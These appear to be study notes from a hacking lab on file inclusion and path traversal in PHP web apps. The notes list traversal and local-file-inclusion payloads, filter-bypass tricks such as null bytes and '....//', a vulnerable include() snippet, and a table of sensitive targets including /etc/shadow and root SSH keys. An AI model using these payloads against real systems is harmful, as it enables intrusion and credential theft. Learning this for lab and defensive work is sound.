# File Inclusion
Reading the server's files because they leave an option to provide a parameter to path e.g. `http://webapp.thm/get.php?file=userCV.pdf`. They are possibly uncorrectly validated and with a couple of tricks able to read what they aren't supposed to.

**Helpful to read the errors while providing wrong path e.g.:**<br>
`Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12`

## Path Traversal (Directory traversal)
just going through server's file system:
- dot-dot-slash attack - `http://webapp.thm/get.php?file=../../../../etc/passwd`
- just using absolute path - `http://webapp.thm/get.php?file=/etc/passwd`

Some useful files to look into:
|Location|Description|
|--- |--- |
|/etc/issue|contains a message or system identification to be printed before the login prompt.|
|/etc/profile|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|/proc/version|specifies the version of the Linux kernel|
|/etc/passwd|has all registered user that has access to a system|
|/etc/shadow|contains information about the system's users' passwords|
|/root/.bash_history|contains the history commands for root user|
|/var/log/dmessage|contains global system messages, including the messages that are logged during system startup|
|/var/mail/root|all emails for root user|
|/root/.ssh/id_rsa|Private SSH keys for a root or any known valid user on the server|
|/var/log/apache2/access.log|the accessed requests for Apache  webserver|
|C:\boot.ini|contains the boot options for computers with BIOS firmware|

## Local File Inclusion (LFI)
- `http://webapp.thm/index.php?lang=AR.php` - simply `http://webapp.thm/get.php?file=/etc/passwd`

- The dev specified the directory:

	```php
	<?PHP 
		include("languages/". $_GET['lang']); 
	?>
	```

	dot dot attack: `http://webapp.thm/index.php?lang=../../../../etc/passwd`

- When the dev specified the extension, use the NULL BYTE `%00`, works only up to <u>PHP 5.3.3</u>:<br>
`include("languages/../../../../../etc/passwd%00").".php");` -> `include("languages/../../../../../etc/passwd");`

- When the words are filtered, try to use some tricks like:<br>
`/etc/passwd` -> `/etc/./passwd` OR `/etc/passwd/./`

- Sometimes the `../` is filtered - try this neat trick:<br>
`....//....//....//....//....//etc/passwd` filtered to `../../../../etc/passwd`

- There are cases when the dev forces use to enter a specific directory like `languages`. Enter it and get out immediately:<br>`?lang=languages/../../../../../etc/passwd`